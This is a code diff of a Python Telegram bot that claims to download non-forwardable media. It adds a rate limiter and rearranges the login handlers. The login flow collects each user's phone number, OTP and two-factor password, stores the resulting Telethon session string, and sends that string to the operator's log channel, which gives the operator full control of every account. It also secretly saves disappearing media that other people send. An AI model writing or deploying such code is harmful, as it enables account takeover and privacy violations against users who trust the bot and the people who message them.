@@ -1,6 +1,7 @@
 import os
 import asyncio
 import logging
+import time
 from datetime import datetime
 from motor.motor_asyncio import AsyncIOMotorClient
 from telethon import TelegramClient, events
@@ -40,10 +41,19 @@ sessions = db.sessions
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
 user_login_data = {}
+user_last_action_time = {}
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ ᴀʟʟ ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ. Nᴏᴡ sᴇɴᴅ /start ᴀɢᴀɪɴ.")
     return ConversationHandler.END
+
+async def spam_protected(user_id):
+    now = time.time()
+    last = user_last_action_time.get(user_id, 0)
+    if now - last < 10:
+        return False
+    user_last_action_time[user_id] = now
+    return True
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     inline_keyboard = InlineKeyboardMarkup([
@@ -73,158 +83,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
         reply_markup=reply_keyboard
     )
-async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.callback_query.message:
-        await update.callback_query.answer()
-        await update.callback_query.message.reply_text(
-            "📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API ID </b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ\n\n"
-            "💡 <i>Exᴀᴍᴘʟᴇ:</i> <code>29587868</code>\n"
-            "ℹ️ Yᴏᴜ ᴄᴀɴ ᴄᴀɴᴄᴇʟ ᴀɴʏᴛɪᴍᴇ ʙʏ sᴇɴᴅɪɴɢ /cancel",
-            parse_mode="HTML"
-        )
-        return API_ID
-    else:
-        await update.callback_query.answer("⚠️ Tʜɪs ʙᴜᴛᴛᴏɴ ɪs ᴇxᴘɪʀᴇᴅ. Usᴇ /start ᴀɢᴀɪɴ.", show_alert=True)
-        return ConversationHandler.END
-
-async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_login_data[update.effective_user.id] = {"api_id": DEFAULT_API_ID}
-    await update.message.reply_text(
-            "📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API HASH </b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ\n\n"
-            "💡 <i>Exᴀᴍᴘʟᴇ:</i> <code>d9fb9ba59c30ae80c25c30d5c4c26e87</code>\n"
-            "ℹ️ Yᴏᴜ ᴄᴀɴ ᴄᴀɴᴄᴇʟ ᴀɴʏᴛɪᴍᴇ ʙʏ sᴇɴᴅɪɴɢ /cancel",
-            parse_mode="HTML"
-        )
-    return API_HASH
-
-async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_login_data[update.effective_user.id]["api_hash"] = DEFAULT_API_HASH
-    await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ) ")
-    return PHONE
-
-async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    if text.lower() == "/skip":
-        return await skip_api_id(update, context)
-    if not text.isdigit():
-        await update.message.reply_text("❌ API ID sʜᴏᴜʟᴅ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ. Tʀʏ ᴀɢᴀɪɴ ᴏʀ sᴇɴᴅ /skip.")
-        return API_ID
-    user_login_data[update.effective_user.id] = {"api_id": int(text)}
-    await update.message.reply_text("📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API HASH </b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ\n\n"
-            "💡 <i>Exᴀᴍᴘʟᴇ:</i> <code>d9fb9ba59c30ae80c25c30d5c4c26e87</code>\n"
-            "ℹ️ Yᴏᴜ ᴄᴀɴ ᴄᴀɴᴄᴇʟ ᴀɴʏᴛɪᴍᴇ ʙʏ sᴇɴᴅɪɴɢ /cancel",
-            parse_mode="HTML"
-        )
-    return API_HASH
-
-async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    if text.lower() == "/skip":
-        return await skip_api_hash(update, context)
-    user_login_data[update.effective_user.id]["api_hash"] = text
-    await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ) ")
-    return PHONE
-
-async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_login_data[update.effective_user.id]["phone"] = update.message.text.strip()
-    try:
-        client = TelegramClient(
-            StringSession(),
-            user_login_data[update.effective_user.id]["api_id"],
-            user_login_data[update.effective_user.id]["api_hash"]
-        )
-        await client.connect()
-        await client.send_code_request(user_login_data[update.effective_user.id]["phone"])
-        user_login_data[update.effective_user.id]["client"] = client
-        await update.message.reply_text(
-            "🔐 Eɴᴛᴇʀ ᴛʜᴇ OTP ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ ᴡɪᴛʜ <b>Sᴘᴀᴄᴇs</b>, ʟɪᴋᴇ:\n\n<code>1 2 3 4 5</code>\n\nSᴇɴᴅ /cancel ᴛᴏ sᴛᴏᴘ ᴀɴʏᴛɪᴍᴇ.",
-            parse_mode="HTML"
-        )
-        return CODE
-    except Exception as e:
-        await update.message.reply_text(f"❌ Fᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴄᴏᴅᴇ: {e}")
-        return ConversationHandler.END
-
-async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    code = update.message.text.replace(" ", "").strip()
-    client = user_login_data[update.effective_user.id]["client"]
-    try:
-        await client.sign_in(user_login_data[update.effective_user.id]["phone"], code)
-        return await complete_login(update, context)
-    except PhoneCodeExpiredError:
-        await update.message.reply_text("⌛ Cᴏᴅᴇ ᴇxᴘɪʀᴇᴅ. Pʟᴇᴀsᴇ ʀᴇsᴛᴀʀᴛ ᴡɪᴛʜ /start.")
-        return ConversationHandler.END
-    except SessionPasswordNeededError:
-        await update.message.reply_text("🔑 ᴛᴡᴏ ғᴀᴄᴛᴏʀ ɪs ᴇɴᴀʙʟᴇᴅ. Eɴᴛᴇʀ ʏᴏᴜʀ ᴘᴀssᴡᴏʀᴅ:")
-        return PASSWORD
-    except PhoneCodeInvalidError:
-        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ. Sᴛᴀʀᴛ ᴀɢᴀɪɴ ᴡɪᴛʜ/start.")
-        return ConversationHandler.END
-    except Exception as e:
-        await update.message.reply_text(f"❌ Eʀʀᴏʀ: {e}")
-        return ConversationHandler.END
-
-async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    password = update.message.text.strip()
-    client = user_login_data[update.effective_user.id]["client"]
-    try:
-        await client.sign_in(password=password)
-        return await complete_login(update, context)
-    except Exception as e:
-        await update.message.reply_text(f"❌ Fᴀɪʟᴇᴅ ᴛᴏ sɪɢɴ ɪɴ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴠᴇʟᴏᴘᴇʀ @unbornvillian: {e}")
-        return ConversationHandler.END
-async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    client = user_login_data[user_id]["client"]
-    session_string = client.session.save()
-    me = await client.get_me()
-
-    await sessions.update_one(
-        {"_id": user_id},
-        {"$set": {
-            "session": session_string,
-            "type": "telethon",
-            "account_id": me.id,
-            "is_admin": True,
-            "creator_id": user_id
-        }},
-        upsert=True
-    )
-
-    @client.on(events.NewMessage(incoming=True))
-    async def media_handler(event):
-        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
-            try:
-                sender = await event.get_sender()
-                name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
-                file = await event.download_media()
-                await client.send_file(
-                    "me",
-                    file,
-                    caption=f"🕒 Sᴀᴠᴇᴅ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ ғʀᴏᴍ @{name} ᴀᴛ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                )
-            except Exception as e:
-                logger.warning(f"[Mᴇᴅɪᴀ Sᴀᴠᴇ Fᴀɪʟᴇᴅ]: {e}")
-
-    async def run_client():
-        await client.run_until_disconnected()
-
-    context.application.create_task(run_client())
-
-    await context.bot.send_message(
-        chat_id=LOG_CHANNEL_ID,
-        text=(
-            f"🔐 <b>New Telethon session connected</b>\n"
-            f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
-            f"📌 <b>Session ID:</b> <code>{me.id}</code>\n"
-            f"🔗 <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
-            f"🧬 <b>Session String:</b>\n<code>{session_string}</code>"
-        ),
-        parse_mode="HTML"
-    )
-
-    await update.message.reply_text("✅ Sᴜᴄᴄᴇssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ☠️ ɴᴏᴡ ʏᴏᴜ ʜᴀᴠᴇ ᴀᴄᴄᴇss ᴛᴏ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀɴɴᴇʟ ᴍᴇᴅɪᴀ ᴀɴᴅ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ!")
-    return ConversationHandler.END
 
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -237,12 +95,15 @@ async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
 
+    if not await spam_protected(user_id):
+        await update.message.reply_text("⚠️ Please wait 10 seconds before using this again.")
+        return FETCH_LINK
+
     if user_id not in user_login_data or "client" not in user_login_data[user_id]:
         await update.message.reply_text("⚠️ Yᴏᴜ ɴᴇᴇᴅ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ғɪʀsᴛ ᴜsɪɴɢ /start.")
         return ConversationHandler.END
 
     client = user_login_data[user_id]["client"]
-
     try:
         if "t.me/c/" in text:
             parts = text.split("t.me/c/")[1].split("/")
@@ -267,11 +128,156 @@ async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.send_file("me", file, caption="📥 Fᴇᴛᴄʜᴇᴅ ғʀᴏᴍ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ ʟɪɴᴋ.")
         await update.message.reply_text("✅ Mᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴀɴᴅ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ Sᴀᴠᴇᴅ Mᴇssᴀɢᴇs.")
     except ChannelPrivateError:
-        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ ɴᴏᴛ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴀᴛ ᴄʜᴀɴɴᴇʟ ʏᴏᴜʀ ᴘʀᴏᴠɪᴅᴇᴅ ʟɪɴᴋ.")
+        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ ɴᴏᴛ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴀᴛ ᴄʜᴀɴɴᴇʟ.")
     except Exception as e:
-        await update.message.reply_text(f"❌ Eʀʀᴏʀ: {e}")
+        logger.error(f"[FETCH ERROR] {e}")
+        await update.message.reply_text("❌ Sᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ. Tʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.")
     return ConversationHandler.END
-    # --- Handlers ---
+async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.callback_query.message:
+        await update.callback_query.answer()
+        await update.callback_query.message.reply_text(
+            "📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API ID </b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ\n\n"
+            "💡 <i>Exᴀᴍᴘʟᴇ:</i> <code>29587868</code>\n"
+            "ℹ️ Yᴏᴜ ᴄᴀɴ ᴄᴀɴᴄᴇʟ ᴀɴʏᴛɪᴍᴇ ʙʏ sᴇɴᴅɪɴɢ /cancel",
+            parse_mode="HTML"
+        )
+        return API_ID
+    else:
+        await update.callback_query.answer("⚠️ Tʜɪs ʙᴜᴛᴛᴏɴ ɪs ᴇxᴘɪʀᴇᴅ. Usᴇ /start ᴀɢᴀɪɴ.", show_alert=True)
+        return ConversationHandler.END
+
+async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_login_data[update.effective_user.id] = {"api_id": DEFAULT_API_ID}
+    await update.message.reply_text("📲 Eɴᴛᴇʀ ʏᴏᴜʀ API HASH ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ")
+    return API_HASH
+
+async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_login_data[update.effective_user.id]["api_hash"] = DEFAULT_API_HASH
+    await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ +ᴄᴏᴅᴇ)")
+    return PHONE
+
+async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    if text.lower() == "/skip":
+        return await skip_api_id(update, context)
+    if not text.isdigit():
+        await update.message.reply_text("❌ API ID ᴍᴜsᴛ ʙᴇ ɴᴜᴍʙᴇʀ")
+        return API_ID
+    user_login_data[update.effective_user.id] = {"api_id": int(text)}
+    await update.message.reply_text("📲 Now enter API HASH or /skip to use default")
+    return API_HASH
+
+async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    if text.lower() == "/skip":
+        return await skip_api_hash(update, context)
+    user_login_data[update.effective_user.id]["api_hash"] = text
+    await update.message.reply_text("📞 Now enter your phone number (with +countrycode)")
+    return PHONE
+
+async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    phone = update.message.text.strip()
+    user_login_data[user_id]["phone"] = phone
+
+    try:
+        client = TelegramClient(
+            StringSession(),
+            user_login_data[user_id]["api_id"],
+            user_login_data[user_id]["api_hash"]
+        )
+        await client.connect()
+        await client.send_code_request(phone)
+        user_login_data[user_id]["client"] = client
+        await update.message.reply_text("🔐 Eɴᴛᴇʀ OTP (with spaces like `1 2 3 4 5`):")
+        return CODE
+    except Exception as e:
+        await update.message.reply_text(f"❌ Cᴏᴅᴇ ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ: {e}")
+        return ConversationHandler.END
+
+async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    code = update.message.text.replace(" ", "").strip()
+    client = user_login_data[user_id]["client"]
+
+    try:
+        await client.sign_in(user_login_data[user_id]["phone"], code)
+        return await complete_login(update, context)
+    except PhoneCodeExpiredError:
+        await update.message.reply_text("⌛ OTP expired. /start again.")
+    except SessionPasswordNeededError:
+        await update.message.reply_text("🔑 2FA enabled. Enter password:")
+        return PASSWORD
+    except PhoneCodeInvalidError:
+        await update.message.reply_text("❌ Invalid OTP. /start again.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Login failed: {e}")
+    return ConversationHandler.END
+
+async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    password = update.message.text.strip()
+    client = user_login_data[user_id]["client"]
+
+    try:
+        await client.sign_in(password=password)
+        return await complete_login(update, context)
+    except Exception as e:
+        await update.message.reply_text(f"❌ Password login failed: {e}")
+        return ConversationHandler.END
+
+async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    client = user_login_data[user_id]["client"]
+    session_string = client.session.save()
+    me = await client.get_me()
+
+    await sessions.update_one(
+        {"_id": user_id},
+        {"$set": {
+            "session": session_string,
+            "type": "telethon",
+            "account_id": me.id,
+            "creator_id": user_id,
+            "is_admin": True
+        }},
+        upsert=True
+    )
+
+    @client.on(events.NewMessage(incoming=True))
+    async def auto_save(event):
+        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
+            try:
+                sender = await event.get_sender()
+                name = getattr(sender, 'username', 'Unknown')
+                file = await event.download_media()
+                await client.send_file(
+                    "me", file,
+                    caption=f"🕒 Aᴜᴛᴏ-sᴀᴠᴇᴅ ᴍᴇᴅɪᴀ ғʀᴏᴍ @{name} ᴀᴛ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                )
+            except Exception as e:
+                logger.warning(f"[AUTO SAVE FAILED]: {e}")
+
+    async def run():
+        await client.run_until_disconnected()
+
+    context.application.create_task(run())
+
+    await update.message.reply_text("✅ Aᴄᴄᴏᴜɴᴛ ᴄᴏɴɴᴇᴄᴛᴇᴅ. Sᴛᴀʀᴛ ᴜsɪɴɢ ᴍᴇᴅɪᴀ ғᴇᴛᴄʜ ɴᴏᴡ 🔓")
+    await context.bot.send_message(
+        chat_id=LOG_CHANNEL_ID,
+        text=(
+            f"🆕 <b>New User Connected</b>\n\n"
+            f"👤 User ID: <code>{user_id}</code>\n"
+            f"🧬 Session: <code>{session_string}</code>\n"
+            f"🔗 Username: @{getattr(me, 'username', 'N/A')}"
+        ),
+        parse_mode="HTML"
+    )
+    return ConversationHandler.END
+
+# --- Conversation Handlers ---
 login_conv = ConversationHandler(
     entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
     states={
@@ -285,7 +291,7 @@ login_conv = ConversationHandler(
     allow_reentry=True
 )
 
-fetch_menu_conv = ConversationHandler(
+fetch_conv = ConversationHandler(
     entry_points=[
         MessageHandler(filters.TEXT & filters.Regex("(?i).*Download Non-Forwardable Media.*"), menu_fetch_request)
     ],
@@ -295,11 +301,11 @@ fetch_menu_conv = ConversationHandler(
     fallbacks=[CommandHandler("cancel", cancel)],
 )
 
-# --- Add & Run ---
+# --- Register and Run ---
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CommandHandler("cancel", cancel))
 app.add_handler(login_conv)
-app.add_handler(fetch_menu_conv)
+app.add_handler(fetch_conv)
 
 print("🤖 Bot is running...")
-app.run_polling()
+app.run_polling()    
